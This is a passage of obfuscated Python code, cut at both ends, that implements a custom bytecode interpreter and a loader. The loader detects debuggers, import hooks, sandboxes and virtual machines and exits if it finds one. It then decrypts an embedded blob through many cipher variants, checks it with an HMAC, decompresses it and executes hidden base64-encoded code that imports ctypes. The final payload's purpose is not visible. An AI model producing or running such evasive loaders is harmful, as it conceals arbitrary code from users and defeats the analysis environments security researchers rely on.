            _m = _r_get(_rs1) ^ _r_get(_rs2)
            _r_set(_rd, _v + _m - _m)
        elif _op == 142:
            _v = _r_get(_rs1)
            _k = _r_get(_rs2)
            if isinstance(_v, int) and isinstance(_k, int):
                _r_set(_rd, (_v | _k) - (_v & _k) + (_v & _k) - (_v | _k) + (_v ^ _k))
            else:
                _r_set(_rd, _v)

        # ─── Control Flow Integrity (opcodes 150-152) ───
        elif _op == 150:
            _exp_lo = _rd & 0xFF
            _exp_mid = _rs1 & 0xFF
            _exp_hi = _rs2 & 0xFF
            _exp_top = (_imm >> 24) & 0xFF if _imm < 0 else (_imm >> 24) & 0xFF
            _expected = _exp_lo | (_exp_mid << 8) | (_exp_hi << 16) | (_exp_top << 24)
            _csum = 0xFFFFFFFF
            _start = _ip - _ilen if _ip >= _ilen else 0
            _end = _ip + 1
            for _ci in range(_start, min(_end, len(_code))):
                _csum ^= _code[_ci]
                _csum = ((_csum << 7) | (_csum >> 25)) & 0xFFFFFFFF
                _csum ^= (_csum >> 13)
            _csum ^= 0xFFFFFFFF
            if (_csum & 0xFFFFFFFF) != (_expected & 0xFFFFFFFF):
                import sys
                sys.stderr.write('error: CFI violation detected\\n')
                sys.exit(1)
        elif _op == 151:
            import sys
            sys.stderr.write('error: integrity failure\\n')
            sys.exit(1)
        elif _op == 152:
            pass

        # ─── Constant Decryption (opcode 160) ───
        elif _op == 160:
            _r_set(_rd, _consts[_imm])
            if isinstance(_r_get(_rd), str):
                pass

        _ip += _ilen

def _vm_decode_fixed(_c, _p, _k, _m, _rm):
    _raw = _c[_p:_p+8]
    _dec = bytes([_raw[i] ^ _k[i % 32] for i in range(len(_raw))])
    _op = _m[_dec[0]]
    _rd = _rm[_dec[1] & 0x3F] if (_dec[1] & 0x3F) < 64 else 0
    _rs1 = _rm[_dec[2] & 0x3F] if (_dec[2] & 0x3F) < 64 else 0
    _rs2_u = _dec[3] & 0x3F
    _count_ops = frozenset((43, 44, 63))
    _rs2 = _rs2_u if _op in _count_ops else _rm[_rs2_u]
    _imm = _dec[4] | (_dec[5] << 8) | (_dec[6] << 16) | (_dec[7] << 24)
    return _op, _rd, _rs1, _rs2, _imm, 8, _rs2_u

def _vm_deserialize(_data):
    import struct
    _op_key = _data[:32]
    _decrypted = _data[32:]
    _map = list(_decrypted[:256])
    _pos = 256
    _flags = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
    _vl_flag = (_flags & 1) != 0
    _poly_flag = (_flags & 8) != 0
    _const_enc = (_flags & 2) != 0
    _cfi_flag = (_flags & 4) != 0
    
    # Read constant encryption key (16 bytes if encrypted)
    _const_key = None
    if _const_enc:
        _const_key = _decrypted[_pos:_pos+16]; _pos += 16
    
    # Skip CFI table (if present)
    if _cfi_flag:
        _cfi_nb = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        for _ in range(_cfi_nb):
            _pos += 12  # skip start(4) + len(4) + csum(4)
    
    # Constants (with optional decryption)
    _cc = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
    _consts = []
    for _ in range(_cc):
        _t = _decrypted[_pos]; _pos += 1
        _sl = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        _s = _decrypted[_pos:_pos+_sl]; _pos += _sl
        # Decrypt string constants (type 4) if encryption is enabled
        if _const_enc and _t == 4 and _const_key:
            _dec_bytes = bytearray(len(_s))
            for _j in range(len(_s)):
                _dec_bytes[_j] = _s[_j] ^ _const_key[_j % 16]
            _s = bytes(_dec_bytes)
        if _t == 0: _v = None
        elif _t == 1: _v = _s == b'1'
        elif _t == 2: _v = int(_s)
        elif _t == 3: _v = float(_s)
        elif _t == 4: _v = _s.decode('utf-8')
        elif _t == 7: _v = _s
        else: _v = _s
        _consts.append(_v)
    _nc = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
    _names = []
    for _ in range(_nc):
        _nl = int.from_bytes(_decrypted[_pos:_pos+2], 'little'); _pos += 2
        _names.append(_decrypted[_pos:_pos+_nl].decode('utf-8')); _pos += _nl
    if _vl_flag or _poly_flag:
        _code_sz = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        _code = _decrypted[_pos:_pos+_code_sz]
    else:
        _ic = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        _code = _decrypted[_pos:_pos+_ic*8]
    return _code, _consts, _names, _map, _op_key, _vl_flag, _poly_flag


def _wraqx():
    if _doqtmuaj.gettrace() is not None:
        _doqtmuaj.stderr.write('error: debugger detected\n'); _doqtmuaj.exit(1)
    _ggowc = bytes.fromhex("9d8181a0adaea59082b7a7b2acd1b680d29daab497d6d281b5978ab2a8a7d39dd4add188bd8a87b1d0a38bb08fad8b859e8ea7a8ddb3abacaca687d4819797d5d48ab7a5d6d6d7acb3a9b6d7a09eb2a993b186b3acd2a890a8909c8b81ab86a9bd978fb6ab8bb081ad8d9cb083add5a68b8ed2d28bb19db48e93968e83a893af8fd397a1d395d6d5a3838ad1a7a0a68e87b4a293b189a3b7a68dd18b81bda0a29dadbcb7b4d397ddafa2a2bda894b19dd7d380bea29182adbea386bda8a0d793b29c89d5a585b0b1969db58d9580d2878e91b49cb39ca093b08d8a81d785a8809d8185d0b591a2b6d29c97908c85ae80888195a6968a8ddd9ed281b0d186aaadb2809d97b58d8ca180d4b6d1a1a394beb1b397b3b2a2b686a296b293af81dca98ad7af809d95d29588d38fad9d9393d6a58cb5a2898a938997859cb3809c9da5b09189928ca18c8db5aba6a081d29793a7b18a87d78dd0a680dc92d1d4be91a3b2909e8b80adddd18d96a994968e9692a6a3ae9cacbdb0a2a395828b86afbe9cd0ddaf928389d3a3aab2918bacbe93d1afa3a1be81908683b6958f819795beb48ddd97bca8a2d3bd968da285a8a58bafa9bdd58ebd80a780a6a3a3adbda5d493a7aeb59e828db3afd381abd685b4d4a0a1d39dae9e93be8ea98db4dcd3afabd4aaa29cab8f979dd5aaab82b4908ba8b1b082a9d78f8aafdd85928b9191a0a0a280b29693a2a78380b4a990a1d2b3a197a38fd79781a3a1acacd0b78a8c8f8381d383829786b18088ac92aed5b5be8c8c80ab9caedc9587b1dc8aad8aa5d590d296dcb4abbe95a692a2b38dac948596dd918389b48e9ea593afa1bca6aaa380a2a0afaf8a8bd3a38d8a80d4928bb1dca6d0a7a5b0a8a0bda79d86b6a6d1a693ddabb2828f938c938f9ed38d9edcaca7ad899e8181968aaed3a8d4a383b7bca6b1aa8c90a59292a5b4b6d0948fb5a9bdb582b0b5a8d296add3a6808180a5a7d2a593879c8cd3b7a089b5b4bc908e95ddd092819180d691b5bc9ea9a7a7a5aad6adb396b392d485d695a3d2b0ab8fd7a081aed5a5dcaca8a7a99cae8783a0be8aa6a787d4a2a1d1b18b8caaa3d7b2b183b6d78fb1dcb5d096af929491a8bd9dddad928dd2a594a593a2d7d6abb2ac90d4b7b7bca1a1a8ae94aedd8e95a9d6d3d2dca28eac87a791ad8dd79d9eb295d6d2a0aca18ba281ad909187d3d0b2aaae82b3b7d48aad8cddb092d19c92bed5aaa8878f8590aed5b4958cab8ab5b1bd908c87b78b95b1d2959cb681a7d49281d18088dcb7d786a5d697d1d2b389d68f81b0b0a783beb3968fa7a2a0b4ae9682dda1a3d1d0b3a882afa781d6bc87d6b3ad89a28fa9d3d0d6a7a58fd29d9c8892a196d7a6ac83818e94d69ead8b8ea688a5888c95d6afa6dcd2b0ac958b9db09c8f83d082a2a9b5d5a98dbeac85b0bea2a6b4dc")
    _ggowc = bytes(_ ^ 228 for _ in _ggowc).decode()
    _doqtmuaj.breakpointhook = None
    for _qm in ('pydevd','pdb','ipdb','pdbpp','pydevconsole'):
        if _qm in _doqtmuaj.modules:
            _doqtmuaj.stderr.write('error: debugger detected\n'); _doqtmuaj.exit(1)
    _relkpppn = _erzowhix.b64decode(_ejsgy)
    for _qn in ('__import__','compile','exec'):
        _qf = getattr(_doqtmuaj.modules.get('builtins'), _qn, None)
        if _qf is not None:
            _qg = getattr(_qf, '__name__', '')
            if _qg != _qn:
                _doqtmuaj.stderr.write('error: hook detected\n'); _doqtmuaj.exit(1)
    if len(_doqtmuaj.meta_path) > 5:
        _doqtmuaj.stderr.write('error: import hook detected\n'); _doqtmuaj.exit(1)
    if getattr(_doqtmuaj, 'flags', None) and _doqtmuaj.flags.no_user_site:
        _doqtmuaj.stderr.write('error: sandbox detected\n'); _doqtmuaj.exit(1)
    import os
    if any(x in str(_doqtmuaj.platform) or any(y in os.listdir('/proc/sys/kernel') for y in ['//', 'vm']) for x in ['vmware', 'virtualbox', 'qemu']):
        _doqtmuaj.stderr.write('error: virtual machine detected\n'); _doqtmuaj.exit(1)
    if _gefitbrd == 9:
        def _cgzumrdcz(_jzbtafp):
            if _jzbtafp[:2] == b'<~': _jzbtafp = _jzbtafp[2:]
            if _jzbtafp[-2:] == b'~>': _jzbtafp = _jzbtafp[:-2]
            _bkdjksa = bytearray(); _qptfuvnt = 0
            while _qptfuvnt < len(_jzbtafp):
                if _jzbtafp[_qptfuvnt] == 122:
                    _bkdjksa.extend(b'\x00\x00\x00\x00'); _qptfuvnt += 1; continue
                _zkvdl = 0; _nkvglay = 0
                while _qptfuvnt < len(_jzbtafp) and _nkvglay < 5:
                    _zkvdl = _zkvdl * 85 + (_jzbtafp[_qptfuvnt] - 33); _qptfuvnt += 1; _nkvglay += 1
                _diqmskox = _nkvglay - 1
                if _diqmskox > 0: _bkdjksa.extend(_zkvdl.to_bytes(4, 'big')[4-_diqmskox:])
            return bytes(_bkdjksa)
        _uolwxgpf = _cgzumrdcz(_relkpppn)
    elif _gefitbrd == 8:
        _wmtnzl = ('0','1','2','3','4','5','6','7','8','9',
                'A','B','C','D','E','F','G','H','I','J','K','L','M',
                'N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
                'a','b','c','d','e','f','g','h','i','j','k','l','m',
                'n','o','p','q','r','s','t','u','v','w','x','y','z',
                '!','#','$','%','&','(',')','*','+','-',';','<','=',
                '>','?','@','^','_','`','{','|','}','~')
        _vygbku = {c:i for i,c in enumerate(_wmtnzl)}
        def _mqnrqha(_zoxrwbkgm):
            _sfwtrnor = bytearray(); _qdrgqith = 0
            while _qdrgqith < len(_zoxrwbkgm):
                _dibcwz = 0; _sciao = 0
                while _qdrgqith < len(_zoxrwbkgm) and _sciao < 5:
                    _dibcwz = _dibcwz * 85 + _vygbku[chr(_zoxrwbkgm[_qdrgqith])]; _qdrgqith += 1; _sciao += 1
                _swpop = _sciao - 1
                if _swpop > 0: _sfwtrnor.extend(_dibcwz.to_bytes(4, 'big')[4-_swpop:])
            return bytes(_sfwtrnor)
        _uolwxgpf = _mqnrqha(_relkpppn)
    elif _gefitbrd == 2:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _gdahrn, algorithms as _btnpglmn, modes as _uwdzujjrl
        except ImportError:
            _doqtmuaj.stderr.write("error: cryptography not installed\n"); _doqtmuaj.exit(1)
        _egfjoa = _relkpppn[:16]; _dvnpmeg = _relkpppn[-32:]; _hgkomamq = _relkpppn[16:-32]
        _wfqwxnxb = _ehvyis.pbkdf2_hmac('sha256', _ggowc.encode(), _egfjoa, 100000, dklen=80)
        _fkjfur = _wfqwxnxb[:32]; _ghagt = _wfqwxnxb[32:48]; _iznyqzexy = _wfqwxnxb[48:80]
        _cqxzew = _jvcgkkcpr.new(_iznyqzexy, _hgkomamq, digestmod='sha256').digest()
        if not _jvcgkkcpr.compare_digest(_dvnpmeg, _cqxzew):
            _doqtmuaj.stderr.write("error: integrity check failed\n"); _doqtmuaj.exit(1)
        _zbnlji = _gdahrn(_btnpglmn.AES(_fkjfur), _uwdzujjrl.CTR(_ghagt))
        _uolwxgpf = _zbnlji.decryptor().update(_hgkomamq)
    elif _gefitbrd == 12:
        _egfjoa = _relkpppn[:16]; _dvnpmeg = _relkpppn[-32:]; _hgkomamq = _relkpppn[16:-32]
        _wfqwxnxb = _ehvyis.pbkdf2_hmac('sha256', _ggowc.encode(), _egfjoa, 100000, dklen=64)
        _fkjfur = _wfqwxnxb[:32]; _iznyqzexy = _wfqwxnxb[32:64]
        _cqxzew = _jvcgkkcpr.new(_iznyqzexy, _hgkomamq, digestmod='sha256').digest()
        if not _jvcgkkcpr.compare_digest(_dvnpmeg, _cqxzew):
            _doqtmuaj.stderr.write("error: integrity check failed\n"); _doqtmuaj.exit(1)
        _cdyei = 3 + (_egfjoa[0] & 7)
        _egfjoa = bytearray(_hgkomamq)
        for _qidtj in range(_cdyei - 1, -1, -1):
            _wogrvt = (3 + _qidtj) & 7
            _gqhcou = (_qidtj * 0x1B + 0x5A) & 0xFF
            for _ghagt in range(len(_egfjoa)):
                _cdyei = _egfjoa[_ghagt]
                _cdyei ^= _gqhcou
                _cdyei = ((_cdyei >> _wogrvt) | ((_cdyei << (8 - _wogrvt)) & 0xFF))
                _cdyei ^= _fkjfur[(_qidtj * len(_egfjoa) + _ghagt) % len(_fkjfur)]
                _egfjoa[_ghagt] = _cdyei
        _uolwxgpf = bytes(_egfjoa)
    elif _gefitbrd == 11:
        _egfjoa = _relkpppn[:16]; _dvnpmeg = _relkpppn[-32:]; _hgkomamq = _relkpppn[16:-32]
        _wfqwxnxb = _ehvyis.pbkdf2_hmac('sha256', _ggowc.encode(), _egfjoa, 100000, dklen=64)
        _fkjfur = _wfqwxnxb[:32]; _iznyqzexy = _wfqwxnxb[32:64]
        _cqxzew = _jvcgkkcpr.new(_iznyqzexy, _hgkomamq, digestmod='sha256').digest()
        if not _jvcgkkcpr.compare_digest(_dvnpmeg, _cqxzew):
            _doqtmuaj.stderr.write("error: integrity check failed\n"); _doqtmuaj.exit(1)
        _cdyei = _fkjfur[0]
        _uolwxgpf = bytearray()
        for _qidtj in range(len(_hgkomamq)):
            _egfjoa = _hgkomamq[_qidtj] ^ _cdyei
            _uolwxgpf.append(_egfjoa)
            _cdyei = _hgkomamq[_qidtj] ^ _fkjfur[ (_qidtj + 1) % len(_fkjfur) ]
            _cdyei = (((_cdyei << 3) & 0xFF) | (_cdyei >> 5)) ^ 0x5A
        _uolwxgpf = bytes(_uolwxgpf)
    elif _gefitbrd == 13:
        _egfjoa = _relkpppn[:16]; _dvnpmeg = _relkpppn[-32:]; _hgkomamq = _relkpppn[16:-32]
        _wfqwxnxb = _ehvyis.pbkdf2_hmac('sha256', _ggowc.encode(), _egfjoa, 100000, dklen=80)
        _fkjfur = _wfqwxnxb[:32]; _ghagt = _wfqwxnxb[32:48]; _iznyqzexy = _wfqwxnxb[48:80]
        _cqxzew = _jvcgkkcpr.new(_iznyqzexy, _hgkomamq, digestmod='sha256').digest()
        if not _jvcgkkcpr.compare_digest(_dvnpmeg, _cqxzew):
            _doqtmuaj.stderr.write("error: integrity check failed\n"); _doqtmuaj.exit(1)
        import struct as _gwidz
        def _wogrvt(k,c,n):
            s=[0x61707865,0x3320646e,0x79622d32,0x6b206574]
            for i in range(0,32,4):s.append(_gwidz.unpack('<I',k[i:i+4])[0])
            s.append(c&0xFFFFFFFF)
            for i in range(0,12,4):s.append(_gwidz.unpack('<I',n[i:i+4])[0])
            w=list(s)
            def q(a,b,c,d):
                a=(a+b)&0xFFFFFFFF;d^=a;d=((d<<16)|(d>>16))&0xFFFFFFFF
                c=(c+d)&0xFFFFFFFF;b^=c;b=((b<<12)|(b>>20))&0xFFFFFFFF
                a=(a+b)&0xFFFFFFFF;d^=a;d=((d<<8)|(d>>24))&0xFFFFFFFF
                c=(c+d)&0xFFFFFFFF;b^=c;b=((b<<7)|(b>>25))&0xFFFFFFFF
                return a,b,c,d
            for _ in range(10):
                w[0],w[4],w[8],w[12]=q(w[0],w[4],w[8],w[12])
                w[1],w[5],w[9],w[13]=q(w[1],w[5],w[9],w[13])
                w[2],w[6],w[10],w[14]=q(w[2],w[6],w[10],w[14])
                w[3],w[7],w[11],w[15]=q(w[3],w[7],w[11],w[15])
                w[0],w[5],w[10],w[15]=q(w[0],w[5],w[10],w[15])
                w[1],w[6],w[11],w[12]=q(w[1],w[6],w[11],w[12])
                w[2],w[7],w[8],w[13]=q(w[2],w[7],w[8],w[13])
                w[3],w[4],w[9],w[14]=q(w[3],w[4],w[9],w[14])
            r=bytearray()
            for i in range(16):r.extend(_gwidz.pack('<I',(s[i]+w[i])&0xFFFFFFFF))
            return bytes(r)
        _qidtj = _gwidz.unpack('<I',_ghagt[:4])[0]
        _ghagt = _ghagt[4:]
        _egfjoa = bytearray()
        while len(_egfjoa) < len(_hgkomamq):
            _cdyei = _wogrvt(_fkjfur, _qidtj, _ghagt)
            for _gqhcou in range(min(64, len(_hgkomamq) - len(_egfjoa))):
                _egfjoa.append(_hgkomamq[len(_egfjoa)] ^ _cdyei[_gqhcou])
            _qidtj += 1
        _uolwxgpf = bytes(_egfjoa)
    elif _gefitbrd == 0:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _gdahrn, algorithms as _btnpglmn, modes as _uwdzujjrl
        except ImportError:
            _doqtmuaj.stderr.write("error: cryptography not installed\n"); _doqtmuaj.exit(1)
        _egfjoa = _relkpppn[:16]; _dvnpmeg = _relkpppn[-32:]; _hgkomamq = _relkpppn[16:-32]
        _wfqwxnxb = _ehvyis.pbkdf2_hmac('sha256', _ggowc.encode(), _egfjoa, 100000, dklen=64)
        _fkjfur = _wfqwxnxb[:32]; _iznyqzexy = _wfqwxnxb[32:64]
        _cqxzew = _jvcgkkcpr.new(_iznyqzexy, _hgkomamq, digestmod='sha256').digest()
        if not _jvcgkkcpr.compare_digest(_dvnpmeg, _cqxzew):
            _doqtmuaj.stderr.write("error: integrity check failed\n"); _doqtmuaj.exit(1)
        _zbnlji = _gdahrn(_btnpglmn.AES(_fkjfur), _uwdzujjrl.ECB())
        _uolwxgpf = _zbnlji.decryptor()
        _uolwxgpf = _uolwxgpf.update(_hgkomamq) + _uolwxgpf.finalize()
        _cdyei = _uolwxgpf[-1]
        if _cdyei < 1 or _cdyei > 16 or not all(_ == _cdyei for _ in _uolwxgpf[-_cdyei:]):
            _doqtmuaj.stderr.write("error: decryption failed\n"); _doqtmuaj.exit(1)
        _uolwxgpf = _uolwxgpf[:-_cdyei]
    elif _gefitbrd == 4:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _gdahrn, algorithms as _btnpglmn, modes as _uwdzujjrl
        except ImportError:
            _doqtmuaj.stderr.write("error: cryptography not installed\n"); _doqtmuaj.exit(1)
        _egfjoa = _relkpppn[:16]; _dvnpmeg = _relkpppn[-32:]; _hgkomamq = _relkpppn[16:-32]
        _wfqwxnxb = _ehvyis.pbkdf2_hmac('sha256', _ggowc.encode(), _egfjoa, 100000, dklen=80)
        _fkjfur = _wfqwxnxb[:32]; _ghagt = _wfqwxnxb[32:48]; _iznyqzexy = _wfqwxnxb[48:80]
        _cqxzew = _jvcgkkcpr.new(_iznyqzexy, _hgkomamq, digestmod='sha256').digest()
        if not _jvcgkkcpr.compare_digest(_dvnpmeg, _cqxzew):
            _doqtmuaj.stderr.write("error: integrity check failed\n"); _doqtmuaj.exit(1)
        _zbnlji = _gdahrn(_btnpglmn.ChaCha20(_fkjfur, _ghagt), mode=None)
        _uolwxgpf = _zbnlji.decryptor().update(_hgkomamq)
    elif _gefitbrd == 6:
        _uolwxgpf = _erzowhix.b64decode(_relkpppn)
    elif _gefitbrd == 10:
        _uolwxgpf = bytes.fromhex(_relkpppn.decode('ascii'))
    elif _gefitbrd == 7:
        _uolwxgpf = _erzowhix.b32decode(_relkpppn)
    elif _gefitbrd == 5:
        _egfjoa = _relkpppn[:16]; _dvnpmeg = _relkpppn[-32:]; _hgkomamq = _relkpppn[16:-32]
        _wfqwxnxb = _ehvyis.pbkdf2_hmac('sha256', _ggowc.encode(), _egfjoa, 100000, dklen=64)
        _fkjfur = _wfqwxnxb[:32]; _iznyqzexy = _wfqwxnxb[32:64]
        _cqxzew = _jvcgkkcpr.new(_iznyqzexy, _hgkomamq, digestmod='sha256').digest()
        if not _jvcgkkcpr.compare_digest(_dvnpmeg, _cqxzew):
            _doqtmuaj.stderr.write("error: integrity check failed\n"); _doqtmuaj.exit(1)
        _uolwxgpf = bytes(_hgkomamq[i] ^ _fkjfur[i % 32] for i in range(len(_hgkomamq)))
    elif _gefitbrd == 3:
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _ckzvha
        except ImportError:
            _doqtmuaj.stderr.write("error: cryptography not installed\n"); _doqtmuaj.exit(1)
        _egfjoa = _relkpppn[:16]; _dvnpmeg = _relkpppn[-32:]; _uolwxgpf = _relkpppn[16:-32]
        _hgkomamq = _uolwxgpf[:-16]; _cdyei = _uolwxgpf[-16:]
        _wfqwxnxb = _ehvyis.pbkdf2_hmac('sha256', _ggowc.encode(), _egfjoa, 100000, dklen=76)
        _fkjfur = _wfqwxnxb[:32]; _ghagt = _wfqwxnxb[32:44]; _iznyqzexy = _wfqwxnxb[44:76]
        _cqxzew = _jvcgkkcpr.new(_iznyqzexy, _uolwxgpf, digestmod='sha256').digest()
        if not _jvcgkkcpr.compare_digest(_dvnpmeg, _cqxzew):
            _doqtmuaj.stderr.write("error: integrity check failed\n"); _doqtmuaj.exit(1)
        _uolwxgpf = _ckzvha(_fkjfur).decrypt(_ghagt, _hgkomamq + _cdyei, None)
    elif _gefitbrd == 1:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _gdahrn, algorithms as _btnpglmn, modes as _uwdzujjrl
        except ImportError:
            _doqtmuaj.stderr.write("error: cryptography not installed\n"); _doqtmuaj.exit(1)
        _egfjoa = _relkpppn[:16]; _dvnpmeg = _relkpppn[-32:]; _hgkomamq = _relkpppn[16:-32]
        _wfqwxnxb = _ehvyis.pbkdf2_hmac('sha256', _ggowc.encode(), _egfjoa, 100000, dklen=80)
        _fkjfur = _wfqwxnxb[:32]; _ghagt = _wfqwxnxb[32:48]; _iznyqzexy = _wfqwxnxb[48:80]
        _cqxzew = _jvcgkkcpr.new(_iznyqzexy, _hgkomamq, digestmod='sha256').digest()
        if not _jvcgkkcpr.compare_digest(_dvnpmeg, _cqxzew):
            _doqtmuaj.stderr.write("error: integrity check failed\n"); _doqtmuaj.exit(1)
        _zbnlji = _gdahrn(_btnpglmn.AES(_fkjfur), _uwdzujjrl.CBC(_ghagt))
        _uolwxgpf = _zbnlji.decryptor()
        _uolwxgpf = _uolwxgpf.update(_hgkomamq) + _uolwxgpf.finalize()
        _cdyei = _uolwxgpf[-1]
        if _cdyei < 1 or _cdyei > 16 or not all(_ == _cdyei for _ in _uolwxgpf[-_cdyei:]):
            _doqtmuaj.stderr.write("error: decryption failed\n"); _doqtmuaj.exit(1)
        _uolwxgpf = _uolwxgpf[:-_cdyei]
    else:
        _doqtmuaj.stderr.write("error: unsupported algorithm\n"); _doqtmuaj.exit(1)
    _vk = bytes.fromhex("e38c197afa9c544ff5c4c3a1eec8da57ad5dac2e0f303dce1bb97c7034488f58")
    _vn = bytes.fromhex("c24ba06ac5c2eee29f6af598d660dd95")
    _sig = _uolwxgpf[-32:]
    _pl = _uolwxgpf[4:-32]
    import hmac, hashlib
    if not hmac.compare_digest(_sig, hmac.new(_vk, _pl, hashlib.sha256).digest()):
        _doqtmuaj.stderr.write('error: VM integrity check failed\n'); _doqtmuaj.exit(1)
    _pd = bytes([_pl[i] ^ _vk[i % 32] ^ _vn[i % 16] for i in range(len(_pl))])
    if _uolwxgpf[1] == 1:
        import zlib as _kddwy
        _pd = _kddwy.decompress(_pd)
    elif _uolwxgpf[1] == 2:
        import lzma as _kddwy
        _pd = _kddwy.decompress(_pd)
    elif _uolwxgpf[1] == 3:
        import bz2 as _kddwy
        _pd = _kddwy.decompress(_pd)
    elif _uolwxgpf[1] == 4:
        import brotli as _kddwy
        _pd = _kddwy.decompress(_pd)
    elif _uolwxgpf[1] == 5:
        import zstandard as _kddwy
        _pd = _kddwy.decompress(_pd)
    elif _uolwxgpf[1] == 6:
        import gzip as _kddwy
        _pd = _kddwy.decompress(_pd)
    elif _uolwxgpf[1] == 7:
        import lz4.frame as _kddwy
        _pd = _kddwy.decompress(_pd)
    elif _uolwxgpf[1] == 8:
        import snappy as _kddwy
        _pd = _kddwy.decompress(_pd)
    elif _uolwxgpf[1] == 9:
        import gzip as _kddwy
        _pd = _kddwy.decompress(_pd)
    elif _uolwxgpf[1] == 10:
        import blosc as _kddwy
        _pd = _kddwy.decompress(_pd)
    else:
        pass
    _c, _k, _m, _map, _ok, _ht, _pf = _vm_deserialize(_pd)
    exec(compile(_erzowhix.b64decode("aW1wb3J0IGJhc2U2NAppbXBvcnQgaGFzaGxpYgppbXBvcnQgaG1hYwppbXBvcnQgY3R5cGVzCmltcG9ydCBiYXNlNjQKaW1wb3J0IGhhc2hsaWIKaW1wb3J0IGhtYWMKaW1wb3J0IGN0eXBlcwpfRlVOQ19LRVkgPSBiYXNlNjQuYjY0ZGVjb2RlKCdja3c5bmJsR2dYc2lPZUo4VFJiTFlENlZTN0d6THU2WjlTaW5YMGR4K2FJPScpCl9GRU5DX0RBVEEgPSBbYmFzZTY0LmI2NGRlY29kZSgnZUt4dTFleDlrcUNyVGozZ2Fhd1hUTU5ZKzZDc0xSTWh1Q2NmU25wbWc5b0R1elVrUXNyYlcxbC9kNW1TSklIYmtuWG1oMHhvSENWL0dsS1lWc3d2MGc2b3lxTWpIWWhUbCtrb2puZ1JGcUQ1Uys1L1BFMTE4N05VZjVTRGNnV3h2cmRNVThySUhoQWZpZ1BqVkhxQ2s4dVJRdXYvaFY2emhDS3JydGQ4S1BQa1lNcjVoSFdaOGZXZm1FNVFKUnlyRVFFNFNKWmRoN1I4ZXoyYUxuZFhnck9HYkw5aE4wV2ozT1lsL25teWY5K3lzTXRaZGxTdnVsNU9UNDg0dkFpeXZFWGdFSEJ4aVRzMGo3Z3Y2QnVrTkZaUlpHaUZ5QVNPUzJxbzF1TnlUYWthc2t2QUhMZ3Z5WEpqTDhZPScpLCBiYXNlNjQuYjY0ZGVjb2RlKCdWK0hibys4b0xMMzIzTUI5ZlBIZ2RjYmI2aEdKZ3MwOGJ1b0lMZDRkQW54YWszVjlKR3BTYWJzb0FlcjlLNzdiSms4dndhenlOcVFkREg0ME91VWM3ZjdQSVVFWDdSZ3JJWFY0d1FJN0t0WXFTbTBOQWl4a3FIQVgyQW1FOFg2NExqWmc3V2JhMmRoeGp5bEJtMGZhRzJBSnprZVJzS3gyOVNCRUpnWWdkNUZOaUc0NElaeG5hN3MrZDBqRzhmeTl0VnZ1YTFLMDhxUUMzMFVXMkgva3hxUXd1VzROcTNZMllVcE1ZMUxKbWw3YXBOdkxFc29HVmFpdG11enVuc0VzQ3VwZmJHSUZ6NE1oYkhVTVBEYnVIZy9uWkpRbk1FMXp0T1h3WXhFPScpLCBiYXNlNjQuYjY0ZGVjb2RlKCd0aTBUOW1ZQlBGYndzRTRhVkhtYWd4QUx6Q1lnVzRUZFROWEk5b0tFdHExMW9mUFdmZkdTVnYzNGhmVVcwQloxWEw1Qkp4cFpUdnJXNEdvbktkKzI4Q0U3dnBUTG9XendabitpdFoxMXpzSUlhYU1Xdmg0MWlweGIzK1ZseUdORE11SERCRW5ITEZCWFdORzBveDE1ZnA1b0tlUTJQSVFvRjhwbFJOM0FyS214VXBmK1l2Yk5ac3RTcWcvaDMySmpJK3NMSUdIaVl5amlucTJyNkdDang5Sml0V0pvYXZzU01pM2FJWWoyVkdhZ0F3QmR3TGVTWmQzazZaWmJscmdkcVFTMGczd25vSkNtenc0dFRHdkxOUWxFV0lyaEhZdkxCV2VnVDA0aUV3eDFndGZHNmh6VG5NbEJtMGR4Q0Fxa2x3Sm5HbXd2Rm9nL0JlYnNmYzcrTit4eWJXdjQ3OE5wMDVyZUt3PT0nKSwgYmFzZTY0LmI2NGRlY29kZSgnVG1HU0FiSlVNaFBsWHZJdENWNzZEdGNieWowRGRncWtKc2Rsc1hqZ1RWTkxWWWNEN25SeFdsZG1nUFg4UjdFQS96WHdPTHdXRjIxSHRBWFBSRFlNSFNsZWUvbzNWUXNrWFNESi8xN1FZdXpBcWNDdGVlSGNmN2YxMDVjZnhCSnh6aDExbWRTRjZqOFB0dlJXT2NPNW9TTEFKb2pNMS9YRE1GS29wSE1ZTHBiS08vSjY5T3NrMWNSMXBsSm91a29hZ3JqQm56aXBPU3AvWDRTaXFCWGtrdkNTRjFOWUgrOUJMenMreDYrOVdOOTUwa0R0eHlhWURnTG9qTXdYNjBQZW1TekNDM2Q2VEN3Y21aMWV2SjE1L1lYS21odG44alNJWlBnZ21TQ0NjVXVyQ0d5a0plV1JnanlIT0dmekphbmFzVmZpVWVGVkd0V093alB3TjlDVWNuMXlrT0tnM0l2NmRvOERteGpTUFpyYS81TENheTVlOEdEODlNeXdWVjhsOCtLRlhvUkw2Y0dCWkNMSFh2cUViYk9oWnIycTErMnlEbDZWYnJtMUFGOVJSUHlqd3grTWliKzE3ZEx4U24xT0ttNDhKU2NBUkhnSWdId0ZYSVF3aGdXamJtbHd5Vll6Sk1RRDhEUWZ5emd4VU9ta1FFL2c2alNCdFdUUHZBZ2NuUEJKTXNBcWtQUjRTRDVCaTJkTkNwaDBPMFNWZ25NQlpsVmlFWlIrVnV3bVhkb2JtVGFHbmdkYTcrcEcvQ2xtaDU1ckM5b0VLL0kzaXFuMU1aMVZaeXpCKzRSKzVYNEFZSHBxZ2hsa2Q4QnNiRVl3a2ZzUkVjczlBU3d5WXJNWXYyN0UzSDA3TjNHQ280TU5OeTNrWC9DbGQ3MUhOaHM0TEJLWTZJWXFRZ3EwcUt4WTdFS1QzSVJ4b3h0NVZmaDQxc3lZa2RWR0taT0JDWlpxMWQvQTVaL2QxTkVNMFRQOWtVQWN6eWs5RW16TEQvYWl6NEtZL0VwUUhGem9lSU9o